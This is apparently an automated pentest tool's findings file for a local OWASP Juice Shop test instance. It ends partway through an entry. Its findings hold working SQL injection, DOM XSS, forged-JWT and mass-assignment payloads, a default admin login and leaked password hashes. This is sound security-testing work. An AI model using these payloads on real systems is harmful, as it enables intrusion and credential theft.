@@ -1,0 +1,2338 @@
+{
+  "target": "http://127.0.0.1:3011",
+  "graph_id": "app_assessment",
+  "roe": {
+    "allow_postex": false
+  },
+  "stage": "finalize",
+  "stages_done": [
+    "init",
+    "surface",
+    "prior_reverify",
+    "auth_session",
+    "class_probe",
+    "authz_logic",
+    "component",
+    "validate_book",
+    "finalize"
+  ],
+  "surfaces": [
+    {
+      "path": "/",
+      "method": "GET",
+      "note": "Main SPA entry point - OWASP Juice Shop",
+      "status": "booked"
+    },
+    {
+      "path": "/robots.txt",
+      "method": "GET",
+      "note": "Disallows /ftp directory",
+      "status": "probed"
+    },
+    {
+      "path": "/ftp/",
+      "method": "GET",
+      "note": "Directory listing - file storage accessible",
+      "status": "probed"
+    },
+    {
+      "path": "/encryptionkeys",
+      "method": "GET",
+      "note": "Directory listing - encryption keys directory",
+      "status": "booked"
+    },
+    {
+      "path": "/support/logs",
+      "method": "GET",
+      "note": "Directory listing - log files directory",
+      "status": "probed"
+    },
+    {
+      "path": "/api/Users",
+      "method": "POST",
+      "note": "User registration endpoint",
+      "status": "booked"
+    },
+    {
+      "path": "/api/Users/{id}",
+      "method": "GET",
+      "note": "Single user endpoint",
+      "status": "booked"
+    },
+    {
+      "path": "/rest/user/login",
+      "method": "POST",
+      "note": "Login endpoint - returns JWT",
+      "status": "probed"
+    },
+    {
+      "path": "/rest/user/whoami",
+      "method": "GET",
+      "note": "Current user info endpoint",
+      "status": "booked"
+    },
+    {
+      "path": "/api/Products",
+      "method": "GET",
+      "note": "Product listing API",
+      "status": "booked"
+    },
+    {
+      "path": "/api/Products/{id}",
+      "method": "GET",
+      "note": "Single product API",
+      "status": "booked"
+    },
+    {
+      "path": "/rest/products/search",
+      "method": "GET",
+      "note": "Product search (potential SQL injection)",
+      "status": "booked"
+    },
+    {
+      "path": "/rest/products/{id}/reviews",
+      "method": "GET",
+      "note": "Product reviews API",
+      "status": "open"
+    },
+    {
+      "path": "/api/Feedbacks",
+      "method": "GET",
+      "note": "Customer feedbacks (authenticated access)",
+      "status": "open"
+    },
+    {
+      "path": "/api/Challenges",
+      "method": "GET",
+      "note": "CTF challenges listing (admin)",
+      "status": "probed"
+    },
+    {
+      "path": "/rest/basket/{id}",
+      "method": "GET",
+      "note": "Shopping basket by ID (authenticated)",
+      "status": "booked"
+    },
+    {
+      "path": "/api/Orders",
+      "method": "GET",
+      "note": "Orders endpoint (returns 500)",
+      "status": "open"
+    },
+    {
+      "path": "/rest/order-history",
+      "method": "GET",
+      "note": "Order history (authenticated)",
+      "status": "booked"
+    },
+    {
+      "path": "/rest/memories",
+      "method": "GET",
+      "note": "Photo memories - leaks user password hashes (authenticated)",
+      "status": "booked"
+    },
+    {
+      "path": "/rest/continue-code",
+      "method": "GET",
+      "note": "Continue code for game progress",
+      "status": "open"
+    },
+    {
+      "path": "/rest/captcha",
+      "method": "GET",
+      "note": "CAPTCHA generation endpoint",
+      "status": "open"
+    },
+    {
+      "path": "/rest/admin/application-version",
+      "method": "GET",
+      "note": "Application version: 20.1.1",
+      "status": "open"
+    },
+    {
+      "path": "/rest/admin/application-configuration",
+      "method": "GET",
+      "note": "Full app config - OAuth ID, social URLs, products",
+      "status": "probed"
+    },
+    {
+      "path": "/api-docs",
+      "method": "GET",
+      "note": "Swagger UI documentation",
+      "status": "open"
+    },
+    {
+      "path": "/api-docs/swagger-ui-init.js",
+      "method": "GET",
+      "note": "Swagger init script (serves main SPA)",
+      "status": "open"
+    },
+    {
+      "path": "/.well-known/security.txt",
+      "method": "GET",
+      "note": "Security contact and disclosure info",
+      "status": "open"
+    },
+    {
+      "path": "/graphql",
+      "method": "GET",
+      "note": "GraphQL endpoint (serves SPA)",
+      "status": "probed"
+    },
+    {
+      "path": "/assets/public/images/uploads/",
+      "method": "GET",
+      "note": "Uploaded images directory",
+      "status": "probed"
+    },
+    {
+      "path": "/assets/public/favicon_js.ico",
+      "method": "GET",
+      "note": "Favicon",
+      "status": "open"
+    },
+    {
+      "path": "/main.js",
+      "method": "GET",
+      "note": "Angular main JS bundle with routes",
+      "status": "open"
+    },
+    {
+      "path": "/styles.css",
+      "method": "GET",
+      "note": "Application stylesheet",
+      "status": "open"
+    },
+    {
+      "path": "/swagger.json",
+      "method": "GET",
+      "note": "high_value_probe HTTP 200 GET — swagger spec",
+      "status": "open"
+    },
+    {
+      "path": "/openapi.json",
+      "method": "GET",
+      "note": "high_value_probe HTTP 200 GET — openapi spec",
+      "status": "open"
+    },
+    {
+      "path": "/api/graphql",
+      "method": "GET",
+      "note": "high_value_probe HTTP 500 GET — graphql endpoint [graphql]",
+      "status": "probed"
+    },
+    {
+      "path": "/metrics",
+      "method": "GET",
+      "note": "high_value_probe HTTP 200 GET — metrics scrape",
+      "status": "probed"
+    },
+    {
+      "path": "/actuator",
+      "method": "GET",
+      "note": "high_value_probe HTTP 200 GET — spring actuator",
+      "status": "probed"
+    },
+    {
+      "path": "/actuator/health",
+      "method": "GET",
+      "note": "high_value_probe HTTP 200 GET — actuator health",
+      "status": "probed"
+    },
+    {
+      "path": "/profile/image/url",
+      "method": "GET",
+      "note": "high_value_probe HTTP 200 GET — profile image URL fetch sink (SSRF candidate)",
+      "status": "booked"
+    },
+    {
+      "path": "/profile/image/file",
+      "method": "GET",
+      "note": "high_value_probe HTTP 200 GET — profile image file upload sink",
+      "status": "probed"
+    },
+    {
+      "path": "/rest/user/register",
+      "method": "GET",
+      "note": "high_value_probe HTTP 500 GET — auth register API",
+      "status": "open"
+    },
+    {
+      "path": "/rest/user/reset-password",
+      "method": "GET",
+      "note": "high_value_probe HTTP 500 GET — password reset API",
+      "status": "open"
+    },
+    {
+      "path": "/rest/user/security-question",
+      "method": "GET",
+      "note": "high_value_probe HTTP 500 GET — security question reset",
+      "status": "booked"
+    },
+    {
+      "path": "/rest/user/change-password",
+      "method": "GET",
+      "note": "high_value_probe HTTP 401 GET — change password",
+      "status": "booked"
+    },
+    {
+      "path": "/rest/basket",
+      "method": "GET",
+      "note": "high_value_probe HTTP 401 GET — basket collection",
+      "status": "booked"
+    },
+    {
+      "path": "/api/Users/whoami",
+      "method": "GET",
+      "note": "high_value_probe HTTP 401 GET — user whoami variant",
+      "status": "booked"
+    },
+    {
+      "path": "/api/Cards",
+      "method": "GET",
+      "note": "high_value_probe HTTP 401 GET — payment/card objects API",
+      "status": "open"
+    },
+    {
+      "path": "/api/Recycles",
+      "method": "GET",
+      "note": "high_value_probe HTTP 200 GET — recycle/order-adjacent API",
+      "status": "open"
+    },
+    {
+      "path": "/api/BasketItems",
+      "method": "GET",
+      "note": "high_value_probe HTTP 401 GET — basket items API",
+      "status": "open"
+    },
+    {
+      "path": "/api/Quantitys",
+      "method": "GET",
+      "note": "high_value_probe HTTP 200 GET — quantity API",
+      "status": "open"
+    },
+    {
+      "path": "/rest/basket/1/checkout",
+      "method": "POST",
+      "note": "high_value_probe HTTP 401 POST — basket checkout",
+      "status": "open"
+    },
+    {
+      "path": "/rest/products/reviews",
+      "method": "GET",
+      "note": "high_value_probe HTTP 500 GET — product reviews UGC",
+      "status": "open"
+    },
+    {
+      "path": "/rest/2fa/status",
+      "method": "GET",
+      "note": "high_value_probe HTTP 401 GET — 2FA status",
+      "status": "booked"
+    },
+    {
+      "path": "/rest/2fa/setup",
+      "method": "GET",
+      "note": "high_value_probe HTTP 500 GET — 2FA setup",
+      "status": "booked"
+    },
+    {
+      "path": "/b2b/v2/orders",
+      "method": "GET",
+      "note": "high_value_probe HTTP 401 GET — B2B orders API",
+      "status": "open"
+    },
+    {
+      "path": "/socket.io/",
+      "method": "GET",
+      "note": "high_value_probe HTTP 400 GET — websocket",
+      "status": "probed"
+    },
+    {
+      "path": "/api/challenges/{id}",
+      "method": "GET",
+      "note": "Single challenge - auth required (401 unauth)",
+      "status": "probed"
+    },
+    {
+      "path": "/encryptionkeys/jwt.pub",
+      "method": "GET",
+      "note": "RSA public key for JWT verification",
+      "status": "booked"
+    },
+    {
+      "path": "/encryptionkeys/premium.key",
+      "method": "GET",
+      "note": "Premium/deluxe token key",
+      "status": "booked"
+    },
+    {
+      "path": "/support/logs/access.log.2026-07-24",
+      "method": "GET",
+      "note": "",
+      "status": "probed"
+    },
+    {
+      "path": "/support/logs/audit.json",
+      "method": "GET",
+      "note": "",
+      "status": "probed"
+    },
+    {
+      "path": "/rest/basket/{id}/checkout",
+      "method": "POST",
+      "note": "Unauthenticated order placement",
+      "status": "booked"
+    },
+    {
+      "path": "/rest/2fa/verify",
+      "method": "POST",
+      "note": "2FA verification endpoint",
+      "status": "probed"
+    }
+  ],
+  "actors": [
+    {
+      "id": "anon",
+      "role_hint": "anon",
+      "how": "none",
+      "cookie_keys": [],
+      "notes": "Unauthenticated access to many endpoints"
+    },
+    {
+      "id": "actor_a",
+      "role_hint": "customer",
+      "how": "register",
+      "cookie_keys": [
+        "token"
+      ],
+      "notes": "Registered as test@test.com"
+    },
+    {
+      "id": "actor_b",
+      "role_hint": "admin",
+      "how": "forged_jwt",
+      "cookie_keys": [
+        "token"
+      ],
+      "notes": "Logged in as admin@juice-sh.op with default password admin123"
+    }
+  ],
+  "resources": [
+    {
+      "name": "file",
+      "paths": [
+        "/ftp/",
+        "/encryptionkeys",
+        "/support/logs",
+        "/assets/public/images/uploads/",
+        "/ftp",
+        "/assets/public/images/uploads"
+      ],
+      "id_locations": [
+        "path"
+      ],
+      "sensitivity": "secret",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "open",
+      "notes": "Directory listings on sensitive paths"
+    },
+    {
+      "name": "encryptionkey",
+      "paths": [
+        "/encryptionkeys",
+        "/encryptionkeys/jwt.pub",
+        "/encryptionkeys/premium.key"
+      ],
+      "id_locations": [],
+      "sensitivity": "secret",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "probed",
+      "notes": "Directory listing - encryption keys directory"
+    },
+    {
+      "name": "memory",
+      "paths": [
+        "/rest/memories"
+      ],
+      "id_locations": [],
+      "sensitivity": "secret",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "probed",
+      "notes": "[egress]"
+    },
+    {
+      "name": "profile",
+      "paths": [
+        "/profile/image/url",
+        "/profile/image/file"
+      ],
+      "id_locations": [],
+      "sensitivity": "user",
+      "actions_seen": [
+        "GET",
+        "POST"
+      ],
+      "status": "probed",
+      "notes": "high_value_probe HTTP 200 GET — profile image URL fetch sink (SSRF candidate) [egress] [upload]"
+    },
+    {
+      "name": "user",
+      "paths": [
+        "/api/Users",
+        "/api/users",
+        "/api/users/{id}",
+        "/rest/user/login",
+        "/rest/user/whoami",
+        "/rest/user/register",
+        "/rest/user/reset-password",
+        "/rest/user/security-question",
+        "/rest/user/change-password",
+        "/api/users/whoami"
+      ],
+      "id_locations": [
+        "path",
+        "body"
+      ],
+      "sensitivity": "user",
+      "actions_seen": [
+        "GET",
+        "POST"
+      ],
+      "status": "probed",
+      "notes": "Multiple auth bypasses and data disclosures"
+    },
+    {
+      "name": "config",
+      "paths": [
+        "/rest/admin/application-configuration"
+      ],
+      "id_locations": [],
+      "sensitivity": "secret",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "probed",
+      "notes": "Full app config without auth"
+    },
+    {
+      "name": "ftp",
+      "paths": [
+        "/ftp"
+      ],
+      "id_locations": [],
+      "sensitivity": "secret",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "open",
+      "notes": "Directory listing - file storage accessible"
+    },
+    {
+      "name": "support",
+      "paths": [
+        "/support/logs",
+        "/support/logs/access.log.2026-07-24",
+        "/support/logs/audit.json"
+      ],
+      "id_locations": [],
+      "sensitivity": "user",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "open",
+      "notes": "Directory listing - log files directory"
+    },
+    {
+      "name": "api-doc",
+      "paths": [
+        "/api-docs"
+      ],
+      "id_locations": [],
+      "sensitivity": "user",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "open",
+      "notes": "Swagger UI documentation"
+    },
+    {
+      "name": "graphql",
+      "paths": [
+        "/graphql",
+        "/api/graphql"
+      ],
+      "id_locations": [],
+      "sensitivity": "user",
+      "actions_seen": [
+        "GET",
+        "POST"
+      ],
+      "status": "probed",
+      "notes": "GraphQL endpoint (serves SPA)"
+    },
+    {
+      "name": "swagger",
+      "paths": [
+        "/swagger.json",
+        "/api-docs",
+        "/openapi.json"
+      ],
+      "id_locations": [],
+      "sensitivity": "user",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "probed",
+      "notes": "high_value_probe HTTP 200 GET — swagger spec"
+    },
+    {
+      "name": "openapi",
+      "paths": [
+        "/openapi.json"
+      ],
+      "id_locations": [],
+      "sensitivity": "user",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "open",
+      "notes": "high_value_probe HTTP 200 GET — openapi spec"
+    },
+    {
+      "name": "actuator",
+      "paths": [
+        "/actuator",
+        "/actuator/health"
+      ],
+      "id_locations": [],
+      "sensitivity": "user",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "open",
+      "notes": "high_value_probe HTTP 200 GET — spring actuator"
+    },
+    {
+      "name": "2fa",
+      "paths": [
+        "/rest/2fa/status",
+        "/rest/2fa/setup",
+        "/rest/2fa/verify"
+      ],
+      "id_locations": [],
+      "sensitivity": "user",
+      "actions_seen": [
+        "GET",
+        "POST"
+      ],
+      "status": "probed",
+      "notes": "high_value_probe HTTP 401 GET — 2FA status"
+    },
+    {
+      "name": "admin",
+      "paths": [
+        "/rest/admin/application-version",
+        "/rest/admin/application-configuration"
+      ],
+      "id_locations": [],
+      "sensitivity": "admin",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "probed",
+      "notes": "Application version: 20.1.1"
+    },
+    {
+      "name": "upload",
+      "paths": [
+        "/assets/public/images/uploads",
+        "/profile/image/file"
+      ],
+      "id_locations": [],
+      "sensitivity": "user",
+      "actions_seen": [
+        "GET",
+        "POST"
+      ],
+      "status": "probed",
+      "notes": "Uploaded images directory [upload]"
+    },
+    {
+      "name": "metric",
+      "paths": [
+        "/metrics"
+      ],
+      "id_locations": [],
+      "sensitivity": "public",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "probed",
+      "notes": "high_value_probe HTTP 200 GET — metrics scrape"
+    },
+    {
+      "name": "challenge",
+      "paths": [
+        "/api/Challenges",
+        "/api/challenges",
+        "/api/challenges/{id}"
+      ],
+      "id_locations": [
+        "path"
+      ],
+      "sensitivity": "user",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "probed",
+      "notes": "Challenge metadata without auth"
+    },
+    {
+      "name": "basket",
+      "paths": [
+        "/rest/basket/{id}",
+        "/rest/basket",
+        "/rest/basket/1/checkout",
+        "/rest/basket/{id}/checkout"
+      ],
+      "id_locations": [
+        "path"
+      ],
+      "sensitivity": "user",
+      "actions_seen": [
+        "GET",
+        "POST"
+      ],
+      "status": "probed",
+      "notes": "Unauthenticated access and checkout"
+    },
+    {
+      "name": "order",
+      "paths": [
+        "/api/Orders",
+        "/rest/order-history",
+        "/api/orders"
+      ],
+      "id_locations": [
+        "path"
+      ],
+      "sensitivity": "user",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "probed",
+      "notes": "Unauthenticated order history disclosure"
+    },
+    {
+      "name": "feedback",
+      "paths": [
+        "/api/Feedbacks",
+        "/api/feedbacks"
+      ],
+      "id_locations": [
+        "body"
+      ],
+      "sensitivity": "user",
+      "actions_seen": [
+        "GET",
+        "POST"
+      ],
+      "status": "open",
+      "notes": ""
+    },
+    {
+      "name": "order-history",
+      "paths": [
+        "/rest/order-history"
+      ],
+      "id_locations": [],
+      "sensitivity": "user",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "open",
+      "notes": "Order history (authenticated)"
+    },
+    {
+      "name": "continue-code",
+      "paths": [
+        "/rest/continue-code"
+      ],
+      "id_locations": [],
+      "sensitivity": "user",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "open",
+      "notes": "Continue code for game progress"
+    },
+    {
+      "name": "captcha",
+      "paths": [
+        "/rest/captcha"
+      ],
+      "id_locations": [],
+      "sensitivity": "user",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "open",
+      "notes": "CAPTCHA generation endpoint"
+    },
+    {
+      "name": "security",
+      "paths": [
+        "/.well-known/security.txt"
+      ],
+      "id_locations": [],
+      "sensitivity": "user",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "open",
+      "notes": "Security contact and disclosure info"
+    },
+    {
+      "name": "card",
+      "paths": [
+        "/api/cards"
+      ],
+      "id_locations": [],
+      "sensitivity": "user",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "open",
+      "notes": "high_value_probe HTTP 401 GET — payment/card objects API"
+    },
+    {
+      "name": "recycle",
+      "paths": [
+        "/api/recycles"
+      ],
+      "id_locations": [],
+      "sensitivity": "user",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "open",
+      "notes": "high_value_probe HTTP 200 GET — recycle/order-adjacent API"
+    },
+    {
+      "name": "basketitem",
+      "paths": [
+        "/api/basketitems"
+      ],
+      "id_locations": [],
+      "sensitivity": "user",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "open",
+      "notes": "high_value_probe HTTP 401 GET — basket items API"
+    },
+    {
+      "name": "quantity",
+      "paths": [
+        "/api/quantitys"
+      ],
+      "id_locations": [],
+      "sensitivity": "user",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "open",
+      "notes": "high_value_probe HTTP 200 GET — quantity API"
+    },
+    {
+      "name": "b2b",
+      "paths": [
+        "/b2b/v2/orders"
+      ],
+      "id_locations": [],
+      "sensitivity": "user",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "open",
+      "notes": "high_value_probe HTTP 401 GET — B2B orders API"
+    },
+    {
+      "name": "product",
+      "paths": [
+        "/api/Products",
+        "/rest/products/search",
+        "/api/products",
+        "/api/products/{id}",
+        "/rest/products/{id}/reviews",
+        "/rest/products/reviews"
+      ],
+      "id_locations": [
+        "path",
+        "query"
+      ],
+      "sensitivity": "public",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "open",
+      "notes": ""
+    },
+    {
+      "name": "review",
+      "paths": [
+        "/rest/products/{id}/reviews"
+      ],
+      "id_locations": [
+        "path"
+      ],
+      "sensitivity": "public",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "open",
+      "notes": ""
+    },
+    {
+      "name": "websocket",
+      "paths": [
+        "/socket.io/"
+      ],
+      "id_locations": [],
+      "sensitivity": "public",
+      "actions_seen": [
+        "GET"
+      ],
+      "status": "probed",
+      "notes": "Socket.IO with WebSocket upgrade"
+    }
+  ],
+  "candidates": [
+    {
+      "title": "Mass Assignment Privilege Escalation via POST /api/Users",
+      "location": "/api/Users",
+      "severity": "critical",
+      "proof_excerpt": "POST /api/Users with body {\"email\":\"test_mass_assign@test.com\",\"password\":\"test123\",\"isAdmin\":true,\"role\":\"admin\"} returned HTTP 201 with {\"data\":{\"email\":\"test_mass_assign@test.com\",\"role\":\"admin\",\"isActive\":true}}. The user was created with role=admin, granting full administrative privileges.",
+      "causality": "The user registration endpoint maps request body fields directly to the User model without filtering sensitive fields like role. Passing role=admin in the JSON body sets the user role to admin.",
+      "reproducibility": "Send POST /api/Users with Content-Type application/json and body {\"email\":\"attacker@test.com\",\"password\":\"attacker123\",\"role\":\"admin\"}. The response confirms role=admin.",
+      "impact": "Unprivileged attacker can register as an administrator, granting access to admin-only functionality (admin panel, user management, etc.).",
+      "stage": "class_probe",
+      "ready_to_book": true,
+      "worker_id": "class_probe/pentest-api",
+      "precondition": "Authenticated session (any role)",
+      "affected_actor": "actor_a",
+      "affected_resource": "user"
+    },
+    {
+      "title": "Excessive Data Exposure - /rest/memories leaks embedded user password hashes",
+      "location": "/rest/memories",
+      "severity": "high",
+      "proof_excerpt": "GET /rest/memories returns photo memories with embedded User objects containing password hashes (e.g. bjoern@owasp.org hash 9283f1b2e9669749081963be0462e466, bjoern.kimminich@gmail.com hash 6edd9d726cbdc873c539e41ae8757b8c)",
+      "causality": "API includes nested user objects with sensitive fields in responses",
+      "reproducibility": "Send GET /rest/memories with any valid JWT token",
+      "impact": "Disclosure of password hashes for admin and deluxe users enabling credential compromise",
+      "stage": "surface",
+      "ready_to_book": false,
+      "worker_id": "",
+      "precondition": "Authenticated session",
+      "affected_actor": "actor_a",
+      "affected_resource": "memory"
+    },
+    {
+      "title": "Default/Weak Admin Credentials - admin@juice-sh.op:admin123",
+      "location": "/rest/user/login",
+      "severity": "critical",
+      "proof_excerpt": "POST /rest/user/login with {\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"} returns valid JWT token with role=admin and bid=1",
+      "causality": "Application ships with a default admin account using well-known credentials",
+      "reproducibility": "Send login request with these credentials",
+      "impact": "Full admin access to the application including all user data, admin functionality, and configuration",
+      "stage": "surface",
+      "ready_to_book": false,
+      "worker_id": "",
+      "precondition": "None",
+      "affected_actor": "actor_b",
+      "affected_resource": "user"
+    },
+    {
+      "title": "Application Configuration Disclosure",
+      "location": "/rest/admin/application-configuration",
+      "severity": "medium",
+      "proof_excerpt": "GET /rest/admin/application-configuration returns full config including Google OAuth clientId (1005568560502-6hm16lef8oh46hr2d98vf2ohlnj4nfhq.apps.googleusercontent.com), authorized redirects, social URLs, product data, and challenge configurations",
+      "causality": "Admin configuration API endpoint is accessible without proper authentication",
+      "reproducibility": "Send GET to the endpoint without authentication",
+      "impact": "Exposure of OAuth client ID, internal configuration, and security-related settings",
+      "stage": "surface",
+      "ready_to_book": false,
+      "worker_id": "",
+      "precondition": "None",
+      "affected_actor": "anon",
+      "affected_resource": "config"
+    },
+    {
+      "title": "Directory Listing Enabled on Sensitive Paths",
+      "location": "/ftp/",
+      "severity": "medium",
+      "proof_excerpt": "GET /ftp/ returns directory listing (11274 bytes), also /encryptionkeys and /support/logs return listings",
+      "causality": "Web server directory listing is enabled on sensitive directories",
+      "reproducibility": "Browse to these paths",
+      "impact": "Exposure of file inventory enabling further attacks like file read/download",
+      "stage": "surface",
+      "ready_to_book": false,
+      "worker_id": "",
+      "precondition": "None",
+      "affected_actor": "anon",
+      "affected_resource": "file"
+    },
+    {
+      "title": "SQL Injection in /rest/products/search — Full Database Extraction",
+      "location": "/rest/products/search (GET parameter q)",
+      "severity": "critical",
+      "proof_excerpt": "Payload: apple')) UNION SELECT 1,group_concat(email||':'||password),3,4,5,6,7,8,9 FROM Users-- returned all 28 user rows with email:password_hash including admin@juice-sh.op:0192023a7bbd73250516f069df18b500, role enumeration via UNION SELECT 1,group_concat(id||':'||email||':'||password||':'||role),3,4,5,6,7,8,9 FROM Users-- showed roles (admin, customer, deluxe, accounting). SQLite version 3.44.2 confirmed via sqlite_version(). Table listing: Users, Products, Challenges, etc.",
+      "causality": "The q parameter is directly interpolated into a SQL query without sanitization. Closing the LIKE clause with ')) and appending UNION SELECT allows attacker-controlled output mapping to the 9 result columns.",
+      "reproducibility": "Send GET /rest/products/search?q=apple')) UNION SELECT 1,group_concat(email||':'||password),3,4,5,6,7,8,9 FROM Users-- . All user credentials with password hashes are returned in the JSON response.",
+      "impact": "Full compromise of all user accounts (admin, customer, deluxe, accounting). Password hashes can be cracked offline. Attacker can authenticate as any user including admin.",
+      "stage": "class_probe",
+      "ready_to_book": true,
+      "worker_id": "class_probe/pentest-api",
+      "precondition": "None",
+      "affected_actor": "anon",
+      "affected_resource": "product"
+    },
+    {
+      "title": "DOM XSS in search functionality via unsafe innerHTML",
+      "location": "/#/search?q=",
+      "severity": "high",
+      "proof_excerpt": "Browser execution proof: visited #/search?q=<img src=x onerror=document.title='PX_'+document.cookie> and document.title changed to 'PX_continueCode=8MNaK5VROexd8Nhvt9cOTLSmtyyhYztKziemIaXH34iJ8ij70ZDW3j9Qm42o; language=en'. The q parameter HTML is rendered inside <span id='searchValue'> via innerHTML with event handlers intact and executable.",
+      "causality": "The q URL fragment parameter is reflected verbatim into <span id='searchValue'> via innerHTML (Angular [innerHTML] binding or bypassSecurityTrustHtml). Input payload <img src=x onerror=...> appears as rendered DOM element with executable onerror handler.",
+      "reproducibility": "Visit http://127.0.0.1:3011/#/search?q=<img src=x onerror=alert(1)> in any browser. The script executes immediately on page load.",
+      "impact": "Arbitrary JavaScript execution in the origin context. Attacker can steal cookies (document.cookie accessible as shown), perform authenticated actions, deface page, or redirect to phishing pages. Cookies are not HttpOnly so session theft is trivial.",
+      "stage": "class_probe",
+      "ready_to_book": false,
+      "worker_id": "class_probe/pentest-xss-dom",
+      "precondition": "",
+      "affected_actor": "",
+      "affected_resource": ""
+    },
+    {
+      "title": "Missing Authentication on Product API (BFLA)",
+      "location": "/api/products/{id}",
+      "severity": "high",
+      "proof_excerpt": "PUT /api/products/1 with body {\"name\":\"hacked\",\"price\":0.01} returned HTTP 200 with name changed to 'hacked' and price changed to 0.01. No authentication token was required. POST /api/products also allowed creating products (HTTP 201) without auth. Only DELETE required auth (401).",
+      "causality": "The product modification endpoints do not enforce authentication or authorization checks. Any unauthenticated user can create or modify product data.",
+      "reproducibility": "Send PUT /api/products/1 with {\"name\":\"test\",\"price\":0.01} without any auth headers. Product is modified successfully.",
+      "impact": "Attacker can arbitrarily modify product names, prices, descriptions, and images. Could set prices to near-zero for fraudulent purchases or deface product listings.",
+      "stage": "class_probe",
+      "ready_to_book": true,
+      "worker_id": "class_probe/pentest-api",
+      "precondition": "",
+      "affected_actor": "",
+      "affected_resource": ""
+    },
+    {
+      "title": "Excessive Data Exposure on /api/challenges",
+      "location": "/api/challenges",
+      "severity": "medium",
+      "proof_excerpt": "GET /api/challenges returns all 60+ challenge records including fields: id, key, name, category, description, difficulty, mitigationUrl, solved status, codingChallengeStatus, disabledEnv, ChallengeDependencies with API keys and URLs. No authentication required.",
+      "causality": "The /api/challenges endpoint exposes all challenge metadata without any access control. It should require admin authentication.",
+      "reproducibility": "Send GET /api/challenges without any auth token. Full challenge dataset is returned.",
+      "impact": "Internal challenge configuration, mitigation strategies, API keys/URLs, and solved status are exposed to unauthenticated attackers. Facilitates targeted exploitation of unresolved vulnerabilities.",
+      "stage": "class_probe",
+      "ready_to_book": false,
+      "worker_id": "class_probe/pentest-api",
+      "precondition": "",
+      "affected_actor": "",
+      "affected_resource": ""
+    },
+    {
+      "title": "JWT Algorithm Confusion Attack - Forged Admin Token via alg:none and HS256 with RSA Public Key",
+      "location": "/rest/user/whoami (JWT Bearer token)",
+      "severity": "critical",
+      "proof_excerpt": "Two forged JWTs accepted by server returning admin identity ({\"user\":{\"id\":1,\"email\":\"admin@juice-sh.op\"}}): 1) alg:none token: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiaXNBY3RpdmUiOnRydWV9LCJiaWQiOjEsImlhdCI6MTc4NDg1ODAzM30. 2) HS256 with RSA public key as HMAC secret: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.[payload].GYtP9oBPm8UcoloXUt8MYuFmGGNCZ8sTRS0g4hmpqLs. Public key obtained from /encryptionkeys/jwt.pub.",
+      "causality": "JWT library does not enforce algorithm validation. When the server receives a token with alg:none, it skips signature verification. When receiving HS256, it uses the RSA public key (obtained from /encryptionkeys/jwt.pub) as HMAC secret, which is known to the attacker.",
+      "reproducibility": "1) GET /encryptionkeys/jwt.pub to obtain RSA public key. 2) Craft JWT with alg:none or alg:HS256 signed with public key as HMAC secret. 3) Send GET /rest/user/whoami with Authorization: Bearer <forged_token>. Server returns admin identity.",
+      "impact": "Complete authentication bypass. Attacker can forge tokens for any user including admin, gaining full administrative access to all application functionality and data.",
+      "stage": "component",
+      "ready_to_book": true,
+      "worker_id": "class_probe/pentest-api",
+      "precondition": "Access to /encryptionkeys/jwt.pub (publicly accessible)",
+      "affected_actor": "anon",
+      "affected_resource": "user"
+    },
+    {
+      "title": "Security Question Enumeration via /rest/user/security-question",
+      "location": "/rest/user/security-question",
+      "severity": "medium",
+      "proof_excerpt": "GET /rest/user/security-question?email=admin@juice-sh.op returns {\"question\":{\"id\":2,\"question\":\"Mother's maiden name?\"}}. No authentication required. Any email address can be queried to reveal the associated security question, enabling targeted social engineering or brute-force answers.",
+      "causality": "The endpoint does not require authentication and allows arbitrary email queries to retrieve the security question for password reset.",
+      "reproducibility": "Send GET /rest/user/security-question?email=<target_email> without any auth. The security question is returned.",
+      "impact": "Attacker can enumerate valid user emails and pair them with their security questions, facilitating password reset attacks and account takeover.",
+      "stage": "class_probe",
+      "ready_to_book": true,
+      "worker_id": "class_probe/pentest-api",
+      "precondition": "",
+      "affected_actor": "",
+      "affected_resource": ""
+    },
+    {
+      "title": "Unauthenticated Mass User Data Disclosure via /api/Users",
+      "location": "/api/Users",
+      "severity": "critical",
+      "proof_excerpt": "GET /api/Users without any auth returns all 30+ users with emails, roles, deluxeTokens, lastLoginIp. Response: {\"status\":\"success\",\"data\":[{\"id\":1,\"email\":\"admin@juice-sh.op\",\"role\":\"admin\"},{\"id\":2,\"email\":\"jim@juice-sh.op\",\"role\":\"customer\"},...]}",
+      "causality": "No auth required on User listing endpoint",
+      "reproducibility": "GET /api/Users without any auth headers or cookies",
+      "impact": "Mass disclosure of all user PII (emails, roles, tokens, IPs); 30+ user records exposed including multiple admins",
+      "stage": "component",
+      "ready_to_book": true,
+      "worker_id": "class_probe/pentest-authz-logic",
+      "precondition": "",
+      "affected_actor": "",
+      "affected_resource": ""
+    },
+    {
+      "title": "Unauthenticated basket access and order placement (IDOR + authz bypass)",
